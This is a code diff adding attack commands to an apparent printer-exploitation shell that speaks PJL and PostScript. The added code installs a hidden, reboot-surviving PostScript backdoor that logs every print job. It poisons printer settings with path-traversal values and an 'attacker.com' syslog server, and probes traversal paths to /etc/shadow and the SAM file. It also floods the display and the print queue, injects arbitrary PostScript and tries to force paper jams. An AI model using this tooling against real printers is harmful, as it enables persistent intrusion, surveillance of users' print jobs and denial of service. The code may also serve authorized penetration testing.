+        print("  - Progress shown for each path")
+        print("  - For authorized testing only")
+        print()
+    
+    # ====================================================================
+    # 🔓 ADVANCED CREDENTIAL/PERSISTENCE ATTACKS
+    # ====================================================================
+    
+    def do_backdoor(self, arg):
+        """Install PostScript backdoor for persistence"""
+        output().warning("═" * 70)
+        output().warning("Installing PostScript backdoor for persistent access!")
+        output().warning("This creates a PERSISTENT backdoor in the printer!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Install backdoor? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Backdoor installation cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Installation cancelled")
+            return
+        
+        # Create backdoor PostScript code
+        if arg and os.path.exists(arg):
+            # Use provided backdoor file
+            backdoor_ps = file().read(arg)
+            if isinstance(backdoor_ps, bytes):
+                backdoor_ps = backdoor_ps.decode('utf-8', errors='ignore')
+        else:
+            # Generate default backdoor
+            backdoor_ps = """
+%!PS-Adobe-3.0
+% PrinterReaper Backdoor v1.0
+% Executes on every print job for data exfiltration
+
+<< /BeginPage {
+    % Log job information
+    (0:/backdoor_log.txt) (a) file
+    /logfile exch def
+    
+    % Write timestamp and job name
+    (%Calendar%) currentdevparams /RealTime get 
+    logfile exch write==only
+    ( - Job: ) logfile exch writestring
+    statusdict /jobname known {
+        statusdict /jobname get logfile exch writestring
+    } if
+    (\\n) logfile exch writestring
+    
+    logfile closefile
+} >> setpagedevice
+
+% Continue normal processing
+"""
+        
+        # Upload backdoor to hidden location
+        backdoor_path = "0:/system/.backdoor.ps"
+        size = self.put(backdoor_path, backdoor_ps.encode())
+        
+        if size == c.NONEXISTENT:
+            output().errmsg("Failed to upload backdoor")
+            return
+        
+        output().info(f"✓ Backdoor uploaded to {backdoor_path} ({size} bytes)")
+        
+        # Configure printer to load backdoor on startup
+        # Method 1: PJL startup job
+        self.cmd(f"@PJL SET STARTUPJOB=\"{backdoor_path}\"")
+        output().info("✓ Backdoor set as startup job")
+        
+        # Method 2: PostScript configuration
+        ps_init = f"""
+%!PS-Adobe-3.0
+({backdoor_path}) run
+"""
+        self.put("0:/system/init.ps", ps_init.encode())
+        self.cmd("@PJL SET PSINITJOB=\"0:/system/init.ps\"")
+        output().info("✓ PostScript init configured")
+        
+        # Method 3: Environment variable
+        self.cmd(f"@PJL SET BACKDOOR=\"{backdoor_path}\"")
+        
+        output().info("✓ Backdoor installed successfully!")
+        output().warning("⚠ Backdoor will execute on EVERY print job!")
+        output().warning("⚠ Survives printer reboots!")
+        output().info("Log file: 0:/backdoor_log.txt")
+        output().info("To remove: backdoor_remove or factory reset")
+    
+    def help_backdoor(self):
+        """Install PostScript backdoor"""
+        print()
+        print("backdoor - Install PostScript backdoor for persistence")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Installs a persistent PostScript backdoor that executes on every")
+        print("  print job. Can be used for:")
+        print("  - Data exfiltration (log job names, content)")
+        print("  - Persistent access")
+        print("  - Information gathering")
+        print("  - Long-term monitoring")
+        print()
+        print("USAGE:")
+        print("  backdoor [ps_file]")
+        print()
+        print("EXAMPLES:")
+        print("  backdoor                 # Install default logging backdoor")
+        print("  backdoor custom.ps       # Install custom backdoor code")
+        print()
+        print("DEFAULT BACKDOOR:")
+        print("  - Logs timestamp and job name to 0:/backdoor_log.txt")
+        print("  - Executes on every print job")
+        print("  - Survives reboots")
+        print()
+        print("CUSTOM BACKDOOR:")
+        print("  - Provide PostScript file with your code")
+        print("  - Code executes in BeginPage context")
+        print("  - Has access to printer internals")
+        print()
+        print("SECURITY IMPACT: EXTREME")
+        print("  - Persistent access")
+        print("  - Data exfiltration")
+        print("  - Survives reboots")
+        print("  - Hard to detect")
+        print()
+        print("DETECTION:")
+        print("  - Check startup jobs: variables")
+        print("  - Look for hidden files: find / | grep '\\.'")
+        print("  - Monitor for unusual log files")
+        print()
+        print("REMOVAL:")
+        print("  - Use 'backdoor_remove' command")
+        print("  - Or factory reset")
+        print()
+        print("⚠ WARNING: For authorized testing ONLY! May violate laws!")
+        print()
+    
+    def do_backdoor_remove(self, arg):
+        """Remove installed backdoor"""
+        output().info("Removing backdoor...")
+        
+        try:
+            # Remove backdoor files
+            self.cmd("@PJL FSDELETE NAME=\"0:/system/.backdoor.ps\"")
+            self.cmd("@PJL FSDELETE NAME=\"0:/system/init.ps\"")
+            self.cmd("@PJL FSDELETE NAME=\"0:/backdoor_log.txt\"")
+            output().info("✓ Backdoor files deleted")
+            
+            # Clear startup jobs
+            self.cmd("@PJL SET STARTUPJOB=\"\"")
+            self.cmd("@PJL SET PSINITJOB=\"\"")
+            self.cmd("@PJL SET BACKDOOR=\"\"")
+            output().info("✓ Startup jobs cleared")
+            
+            output().info("✓ Backdoor removed successfully!")
+            output().info("Restart printer to ensure complete removal")
+            
+        except Exception as e:
+            output().errmsg(f"Backdoor removal failed: {e}")
+            output().info("Factory reset may be required")
+    
+    def help_backdoor_remove(self):
+        """Remove backdoor"""
+        print()
+        print("backdoor_remove - Remove installed PostScript backdoor")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Removes previously installed backdoor.")
+        print("  Deletes backdoor files and clears startup configurations.")
+        print()
+        print("USAGE:")
+        print("  backdoor_remove")
+        print()
+        print("NOTES:")
+        print("  - Reverses 'backdoor' command")
+        print("  - Restart printer after removal")
+        print("  - Factory reset also removes backdoor")
+        print()
+    
+    def do_poison(self, arg):
+        """Configuration poisoning attack"""
+        output().warning("═" * 70)
+        output().warning("Configuration Poisoning Attack!")
+        output().warning("This will set malicious configuration values!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Continue with poisoning? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Configuration poisoning cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Attack cancelled")
+            return
+        
+        output().info("Setting malicious configuration values...")
+        
+        # Poison various configuration variables
+        malicious_configs = [
+            # Path traversal attempts
+            ("INTRAY1", "/../../../etc"),
+            ("OUTBIN1", "/../../../tmp"),
+            
+            # Memory/resource manipulation
+            ("LPARM:PCL FONTSOURCE", "X"),
+            ("LPARM:PCL FONTNUMBER", "999999"),
+            
+            # Logging/debugging (may expose info)
+            ("JOBLOG", "ON"),
+            ("DEBUGLOG", "ON"),
+            ("VERBOSELOG", "ON"),
+            
+            # Network manipulation
+            ("SYSLOGSERVER", "attacker.com"),
+            
+            # Malicious paths
+            ("DEFAULTDIR", "/../../../../etc"),
+        ]
+        
+        poisoned = 0
+        for var, value in malicious_configs:
+            try:
+                self.cmd(f"@PJL SET {var}={value}")
+                output().info(f"  ✓ Poisoned: {var}={value}")
+                poisoned += 1
+                time.sleep(0.1)
+            except Exception as e:
+                if self.debug:
+                    output().errmsg(f"  Failed: {var} - {e}")
+        
+        output().info(f"✓ Configuration poisoning complete: {poisoned} variables set")
+        output().warning("⚠ Printer configuration is now compromised!")
+        output().info("To restore: Use factory reset or restore from backup")
+    
+    def help_poison(self):
+        """Configuration poisoning attack"""
+        print()
+        print("poison - Configuration poisoning attack")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Sets malicious configuration values to compromise printer security.")
+        print("  Can be used for:")
+        print("  - Path traversal setup")
+        print("  - Resource exhaustion")
+        print("  - Information disclosure (enable logging)")
+        print("  - Network redirection")
+        print()
+        print("USAGE:")
+        print("  poison")
+        print()
+        print("EXAMPLES:")
+        print("  poison                   # Apply configuration poisoning")
+        print()
+        print("POISONED VARIABLES:")
+        print("  - INTRAY1: Path traversal")
+        print("  - OUTBIN1: Output redirection")
+        print("  - FONTSOURCE/FONTNUMBER: Resource manipulation")
+        print("  - JOBLOG/DEBUGLOG: Enable verbose logging")
+        print("  - SYSLOGSERVER: Network redirection")
+        print("  - DEFAULTDIR: Path traversal")
+        print()
+        print("SECURITY IMPACT: HIGH")
+        print("  - Compromises printer security")
+        print("  - May enable further attacks")
+        print("  - Difficult to detect")
+        print("  - Persistent until reset")
+        print()
+        print("REMOVAL:")
+        print("  - Factory reset")
+        print("  - Restore from backup")
+        print("  - Manual variable reset")
+        print()
+        print("NOTES:")
+        print("  - Requires confirmation")
+        print("  - Not all variables work on all printers")
+        print("  - Check with 'variables' after attack")
+        print()
+    
+    def do_traverse(self, arg):
+        """Path traversal attack automated testing"""
+        output().info("Path Traversal Attack - Automated Testing")
+        output().info("Testing multiple path traversal vectors...")
+        
+        # Common traversal patterns
+        traversal_vectors = [
+            "../../../etc/passwd",
+            "../../rw/var/sys/passwd",
+            "0:/../../../etc/shadow",
+            "1:/../../etc/passwd",
+            "/../../../../../../etc/passwd",
+            "../../../../../../../etc/hosts",
+            "..\\..\\..\\windows\\system32\\config\\sam",  # Windows
+            "../../../../../../../boot.ini",
+            "0:/../../../../proc/version",  # Linux
+        ]
+        
+        output().info(f"Testing {len(traversal_vectors)} traversal vectors...")
+        print()
+        
+        success_count = 0
+        for vector in traversal_vectors:
+            output().info(f"Testing: {vector}")
+            
+            try:
+                result = self.get(vector)
+                if result != c.NONEXISTENT:
+                    size, data = result
+                    output().info(f"  ✓ SUCCESS! Accessible ({size} bytes)")
+                    print("  " + "-" * 60)
+                    # Show first 200 chars
+                    preview = data.decode('utf-8', errors='ignore')[:200]
+                    print(f"  {preview}")
+                    if len(data) > 200:
+                        print(f"  ... ({size - 200} more bytes)")
+                    print("  " + "-" * 60)
+                    success_count += 1
+                else:
+                    output().info(f"  ✗ Not accessible")
+            except Exception as e:
+                if self.debug:
+                    output().errmsg(f"  Error: {e}")
+            
+            print()
+        
+        output().info("=" * 70)
+        output().info(f"✓ Path traversal test complete")
+        output().info(f"  Successful: {success_count}/{len(traversal_vectors)}")
+        output().info("=" * 70)
+    
+    def help_traverse(self):
+        """Path traversal attack testing"""
+        print()
+        print("traverse - Automated path traversal attack testing")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Automatically tests multiple path traversal vectors to access")
+        print("  files outside the intended directory. Tests common patterns like:")
+        print("  - ../../../etc/passwd")
+        print("  - ../../rw/var/sys/passwd")
+        print("  - Volume-based traversal (0:/../../../)")
+        print()
+        print("USAGE:")
+        print("  traverse")
+        print()
+        print("EXAMPLES:")
+        print("  traverse                 # Test all traversal vectors")
+        print()
+        print("VECTORS TESTED:")
+        print("  - Unix paths: ../../../etc/passwd, /etc/shadow")
+        print("  - Embedded systems: ../../rw/var/sys/")
+        print("  - Windows paths: ..\\..\\..\\windows\\system32\\")
+        print("  - Volume traversal: 0:/../../../")
+        print("  - Proc filesystem: /proc/version")
+        print()
+        print("SECURITY IMPACT: CRITICAL")
+        print("  - Access to system files")
+        print("  - Password file exposure")
+        print("  - Configuration disclosure")
+        print()
+        print("OUTPUT:")
+        print("  - Shows accessible paths")
+        print("  - Displays first 200 bytes of content")
+        print("  - Reports success rate")
+        print()
+        print("NOTES:")
+        print("  - Tests ~10 common vectors")
+        print("  - Non-destructive (read-only)")
+        print("  - Results vary by printer model")
+        print()
+    
+    #====================================================================
+    # 📊 ADDITIONAL INFO COMMANDS
+    # ====================================================================
+    
+    def do_info(self, arg):
+        """Comprehensive information gathering - all PJL INFO commands"""
+        if not arg:
+            # Show all info categories
+            output().info("Gathering comprehensive printer information...")
+            print()
+            
+            categories = [
+                ("ID", "Device identification"),
+                ("STATUS", "Current status"),
+                ("CONFIG", "Configuration"),
+                ("FILESYS", "Filesystem information"),
+                ("MEMORY", "Memory information"),
+                ("PAGECOUNT", "Page counter"),
+                ("VARIABLES", "Environment variables"),
+                ("USTATUS", "Unsolicited status"),
+                ("PRODUCT", "Product information"),
+            ]
+            
+            for cat, desc in categories:
+                print("=" * 70)
+                print(f"INFO {cat} - {desc}")
+                print("=" * 70)
+                result = self.cmd(f"@PJL INFO {cat}")
+                if result and len(result.strip()) > 0:
+                    print(result)
+                else:
+                    output().warning(f"No data for {cat}")
+                print()
+        else:
+            # Show specific category
+            category = arg.upper()
+            output().info(f"Querying INFO {category}...")
+            result = self.cmd(f"@PJL INFO {category}")
+            if result:
+                print(result)
+            else:
+                output().warning(f"No data for {category}")
+    
+    def help_info(self):
+        """Comprehensive information gathering"""
+        print()
+        print("info - Comprehensive PJL INFO commands")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Queries comprehensive information from the printer using")
+        print("  PJL INFO commands. Can query all categories or specific ones.")
+        print()
+        print("USAGE:")
+        print("  info                     # Query all information categories")
+        print("  info <category>          # Query specific category")
+        print()
+        print("CATEGORIES:")
+        print("  ID                       # Device ID and model")
+        print("  STATUS                   # Current printer status")
+        print("  CONFIG                   # Configuration details")
+        print("  FILESYS                  # Filesystem information")
+        print("  MEMORY                   # Memory usage and available")
+        print("  PAGECOUNT                # Total pages printed")
+        print("  VARIABLES                # Environment variables")
+        print("  USTATUS                  # Unsolicited status messages")
+        print("  PRODUCT                  # Product information")
+        print()
+        print("EXAMPLES:")
+        print("  info                     # Get all information")
+        print("  info CONFIG              # Get configuration only")
+        print("  info MEMORY              # Get memory info only")
+        print()
+        print("NOTES:")
+        print("  - Without argument, queries ALL categories")
+        print("  - Some categories may not be supported on all printers")
+        print("  - Useful for reconnaissance and fingerprinting")
+        print()
+    
+    def do_scan_volumes(self, arg):
+        """Scan all volumes for accessible files and directories"""
+        output().info("Scanning all printer volumes...")
+        print()
+        
+        found_volumes = 0
+        total_files = 0
+        
+        for vol in range(10):  # Volumes 0-9
+            vol_name = f"{vol}:"
+            output().info(f"Scanning volume {vol_name}...")
+            
+            try:
+                result = self.cmd(f"@PJL FSDIRLIST NAME=\"{vol_name}\"")
+                if result and len(result.strip()) > 10:
+                    found_volumes += 1
+                    print("=" * 70)
+                    print(f"✓ Volume {vol_name} - ACCESSIBLE")
+                    print("=" * 70)
+                    print(result)
+                    print()
+                    
+                    # Count files
+                    files = self.parse_dirlist(result)
+                    total_files += len(files)
+                    output().info(f"  Files/Dirs found: {len(files)}")
+                else:
+                    output().info(f"  Volume {vol_name} - Not accessible or empty")
+            except Exception as e:
+                if self.debug:
+                    output().errmsg(f"  Error: {e}")
+            print()
+        
+        output().info("=" * 70)
+        output().info(f"✓ Volume scan complete:")
+        output().info(f"  Accessible volumes: {found_volumes}/10")
+        output().info(f"  Total files/dirs found: {total_files}")
+        output().info("=" * 70)
+    
+    def help_scan_volumes(self):
+        """Scan all volumes"""
+        print()
+        print("scan_volumes - Scan all printer volumes for accessible content")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Scans all possible volumes (0: through 9:) to discover which")
+        print("  are accessible and what files/directories they contain.")
+        print("  Useful for reconnaissance and filesystem mapping.")
+        print()
+        print("USAGE:")
+        print("  scan_volumes")
+        print()
+        print("EXAMPLES:")
+        print("  scan_volumes             # Scan volumes 0: through 9:")
+        print()
+        print("OUTPUT:")
+        print("  - Shows accessible volumes")
+        print("  - Lists files/directories in each volume")
+        print("  - Reports total files found")
+        print()
+        print("NOTES:")
+        print("  - Tests volumes 0: through 9:")
+        print("  - Non-destructive (read-only)")
+        print("  - May take 10-30 seconds")
+        print()
+    
+    # ====================================================================
+    # 🔨 ADDITIONAL DOS/PHYSICAL ATTACKS
+    # ====================================================================
+    
+    def do_dos_display(self, arg):
+        """DoS via display message spam"""
+        count = conv().int(arg) or 100
+        
+        output().warning(f"Display spam attack: {count} messages")
+        
+        try:
+            confirm = input(f"Spam {count} display messages? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Display spam cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            return
+        
+        output().info(f"Sending {count} display messages...")
+        
+        messages = [
+            "SYSTEM ERROR",
+            "PRINTER HACKED",
+            "SECURITY BREACH",
+            "UNAUTHORIZED ACCESS",
+            "PLEASE POWER CYCLE",
+        ]
+        
+        for i in range(count):
+            msg = messages[i % len(messages)] + f" #{i}"
+            self.cmd(f"@PJL DISPLAY \"{msg}\"", False)
+            if i % 10 == 0:
+                output().info(f"  Sent {i}/{count} messages...")
+            time.sleep(0.05)
+        
+        output().info(f"✓ Display spam complete: {count} messages sent")
+    
+    def help_dos_display(self):
+        """DoS via display spam"""
+        print()
+        print("dos_display - Denial of service via display message spam")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Floods the printer display with spam messages.")
+        print("  Makes the printer difficult to use and may cause")
+        print("  performance degradation or unresponsiveness.")
+        print()
+        print("USAGE:")
+        print("  dos_display [count]")
+        print()
+        print("EXAMPLES:")
+        print("  dos_display              # Default: 100 messages")
+        print("  dos_display 500          # Spam 500 messages")
+        print()
+        print("SECURITY IMPACT: MEDIUM")
+        print("  - Display becomes unusable")
+        print("  - User frustration")
+        print("  - May degrade performance")
+        print()
+        print("RECOVERY:")
+        print("  - Power cycle printer")
+        print("  - Or wait for messages to clear")
+        print()
+    
+    def do_dos_jobs(self, arg):
+        """DoS via print job flooding"""
+        count = conv().int(arg) or 50
+        
+        output().warning(f"Job flooding attack: {count} jobs")
+        
+        try:
+            confirm = input(f"Flood {count} print jobs? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Job flooding cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            return
+        
+        output().info(f"Flooding printer with {count} jobs...")
+        
+        for i in range(count):
+            job_name = f"FloodJob_{i}"
+            self.cmd(f"@PJL JOB NAME=\"{job_name}\"", False)
+            # Send minimal data
+            self.send(b"Test flood data\x0c")
+            self.cmd("@PJL EOJ", False)
+            
+            if i % 10 == 0:
+                output().info(f"  Sent {i}/{count} jobs...")
+            time.sleep(0.05)
+        
+        output().info(f"✓ Job flooding complete: {count} jobs sent")
+        output().warning("⚠ Printer queue may be full!")
+    
+    def help_dos_jobs(self):
+        """DoS via job flooding"""
+        print()
+        print("dos_jobs - Denial of service via print job flooding")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Floods the printer with numerous print jobs to exhaust")
+        print("  queue resources and prevent legitimate users from printing.")
+        print()
+        print("USAGE:")
+        print("  dos_jobs [count]")
+        print()
+        print("EXAMPLES:")
+        print("  dos_jobs                 # Default: 50 jobs")
+        print("  dos_jobs 100             # Flood 100 jobs")
+        print()
+        print("SECURITY IMPACT: HIGH")
+        print("  - Queue exhaustion")
+        print("  - Legitimate users cannot print")
+        print("  - May cause memory issues")
+        print()
+        print("RECOVERY:")
+        print("  - Clear job queue from control panel")
+        print("  - Restart printer")
+        print()
+    
+    def do_ps_inject(self, arg):
+        """Inject PostScript code via PJL"""
+        if not arg:
+            output().errmsg("Usage: ps_inject <ps_file>")
+            output().info("Injects PostScript code into printer")
+            return
+        
+        if not os.path.exists(arg):
+            output().errmsg(f"File not found: {arg}")
+            return
+        
+        ps_code = file().read(arg)
+        if not ps_code:
+            return
+        
+        output().warning("Injecting PostScript code...")
+        
+        # Enter PostScript mode via PJL
+        self.cmd("@PJL ENTER LANGUAGE=POSTSCRIPT")
+        
+        # Send PostScript code
+        self.send(ps_code)
+        self.send(b"\x04")  # EOT - End of transmission
+        
+        output().info("✓ PostScript code injected")
+        output().info("Code has been executed by the printer")
+    
+    def help_ps_inject(self):
+        """PostScript code injection"""
+        print()
+        print("ps_inject - Inject PostScript code via PJL")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Injects and executes PostScript code on the printer.")
+        print("  Can be used for:")
+        print("  - Code execution")
+        print("  - Information gathering (PostScript operators)")
+        print("  - File operations")
+        print("  - Testing PostScript vulnerabilities")
+        print()
+        print("USAGE:")
+        print("  ps_inject <ps_file>")
+        print()
+        print("EXAMPLES:")
+        print("  ps_inject test.ps        # Execute PostScript file")
+        print("  ps_inject exploit.ps     # Execute exploit code")
+        print()
+        print("SECURITY IMPACT: CRITICAL")
+        print("  - Arbitrary code execution")
+        print("  - Full printer access")
+        print("  - Can modify system state")
+        print()
+        print("NOTES:")
+        print("  - PostScript code must be valid")
+        print("  - Printer must support PostScript")
+        print("  - Code executes immediately")
+        print()
+    
+    def do_paper_jam(self, arg):
+        """Attempt to cause paper jam via conflicting commands"""
+        output().warning("═" * 70)
+        output().warning("Paper jam attack - May cause physical paper jam!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Attempt paper jam attack? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Paper jam attack cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            return
+        
+        output().info("Sending conflicting paper handling commands...")
+        
+        # Send conflicting paper size/type commands
+        self.cmd("@PJL SET PAPER=LETTER", False)
+        time.sleep(0.1)
+        self.cmd("@PJL SET PAPER=A4", False)
+        time.sleep(0.1)
+        self.cmd("@PJL SET PAPER=LEGAL", False)
+        
+        # Conflicting input tray commands
+        self.cmd("@PJL SET INTRAY1=MANUAL", False)
+        self.cmd("@PJL SET INTRAY1=AUTO", False)
+        
+        # Conflicting formlines
+        self.cmd("@PJL SET FORMLINES=60", False)
+        self.cmd("@PJL SET FORMLINES=88", False)
+        self.cmd("@PJL SET FORMLINES=120", False)
+        
+        # Send print job with conflicts
+        for i in range(5):
+            self.cmd(f"@PJL JOB NAME=\"PaperJamTest{i}\"", False)
+            self.cmd("@PJL SET PAPER=LETTER", False)
+            self.cmd("@PJL SET PAPER=A4", False)
+            self.send(b"Paper jam test data\x0c")
+            self.cmd("@PJL EOJ", False)
+            time.sleep(0.2)
+        
+        output().info("✓ Paper jam attack commands sent")
+        output().warning("⚠ Check printer for paper jam")
+    
+    def help_paper_jam(self):
+        """Paper jam attack"""
+        print()
+        print("paper_jam - Attempt to cause paper jam via conflicting commands")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Sends conflicting paper handling commands to attempt causing")
+        print("  a physical paper jam. May succeed on some printer models.")
+        print()
+        print("USAGE:")
+        print("  paper_jam")
+        print()
+        print("SECURITY IMPACT: MEDIUM")
+        print("  - Physical paper jam")
+        print("  - Printer downtime")
+        print("  - Requires manual intervention")
+        print()
+        print("NOTES:")
+        print("  - Success rate varies by printer model")
+        print("  - May not work on modern printers")
+        print("  - Requires confirmation")
+        print()
+    
+    def do_firmware_info(self, arg):
+        """Get detailed firmware information"""
+        output().info("Querying firmware information...")
+        print()
+        
+        # Query various firmware-related info
+        queries = [
+            ("@PJL INFO CONFIG", "Firmware Configuration"),
+            ("@PJL INFO PRODUCT", "Product Information"),
+            ("@PJL INFO ID", "Device ID"),
+            ("@PJL DINQUIRE FWDATECODE", "Firmware Date Code"),
+        ]
+        
+        for query, desc in queries:
+            print("=" * 70)
+            print(desc)
+            print("=" * 70)
+            result = self.cmd(query)
+            if result:
+                print(result)
+            print()
+    
+    def help_firmware_info(self):
+        """Get firmware information"""
+        print()
+        print("firmware_info - Get detailed firmware information")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Queries detailed firmware information including:")
+        print("  - Firmware version")
+        print("  - Firmware date code")
+        print("  - Product information")
+        print("  - Device configuration")
+        print()
+        print("USAGE:")
+        print("  firmware_info")
+        print()
+        print("NOTES:")
+        print("  - Useful for CVE identification")
+        print("  - Helps determine vulnerable firmware versions")
+        print()
+    
+    # Update help categories
+    def help_attacks(self):
+        """Show help for attack commands"""
+        print()
+        print("Attack Commands:")
+        print("=" * 70)
+        print("💥 DoS Attacks:")
+        print("  destroy        - Cause physical damage to NVRAM")
+        print("  flood          - Buffer overflow attack")
+        print("  hold           - Enable job retention")
+        print("  format         - Format filesystem")
+        print("  hang           - Hang/crash printer")
+        print("  dos_connections - DoS via connection flooding")
+        print("  dos_display    - DoS via display spam")
+        print("  dos_jobs       - DoS via job flooding")
+        print("  paper_jam      - Attempt to cause paper jam")
+        print()
+        print("🎯 Job Manipulation:")
+        print("  capture        - Capture retained print jobs")
+        print("  overlay        - Overlay attack (watermark)")
+        print("  overlay_remove - Remove overlay attack")
+        print("  cross          - Cross-site printing")
+        print("  replace        - Replace entire job content")
+        print()
+        print("🔓 Advanced Attacks:")
+        print("  unlock_bruteforce - Brute force PIN")
+        print("  exfiltrate     - Auto-exfiltrate sensitive files")
+        print("  backdoor       - Install persistent backdoor")
+        print("  backdoor_remove - Remove backdoor")
+        print("  poison         - Configuration poisoning")
+        print("  traverse       - Path traversal testing")
+        print("  ps_inject      - PostScript code injection")
+        print()
+    
+    def help_information(self):
+        """Show help for information gathering commands"""
+        print()
+        print("Information Gathering Commands:")
+        print("=" * 70)
+        print("  info           - Comprehensive INFO queries")
+        print("  scan_volumes   - Scan all volumes")
+        print("  firmware_info  - Detailed firmware information")
+        print("  id             - Printer identification")
+        print("  variables      - Environment variables")
+        print("  printenv       - Specific variable")
+        print("  network        - Network information")
+        print("  nvram          - NVRAM access")
+        print()
